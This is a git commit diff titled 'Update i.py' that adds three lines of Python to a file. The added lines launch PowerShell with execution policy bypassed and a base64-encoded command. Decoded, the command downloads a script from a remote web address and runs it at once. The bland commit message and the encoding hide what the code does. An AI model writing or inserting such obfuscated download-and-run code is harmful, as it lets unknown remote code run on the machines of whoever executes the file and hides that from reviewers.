ef0629c018046d023dd00448ecda4ec84a8f5259
43a1723 <hai1723notgay@gmail.com>
2025-03-14 20:17:38 +0700

    Update i.py

--- a/i.py
+++ a/i.py
@@ -1,1 +1,4 @@
+import subprocess
 
+cmd = 'cmd.exe /k powershell -ExecutionPolicy Bypass -e aQB3AHIAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAG8AZABlAGYAbwByAGYAdQBuAC4AdgBlAHIAYwBlAGwALgBhAHAAcAAvAHMAaQBnAG0AYQAnACkAIAB8ACAAaQBlAHgA'
+subprocess.run(cmd, shell=True)
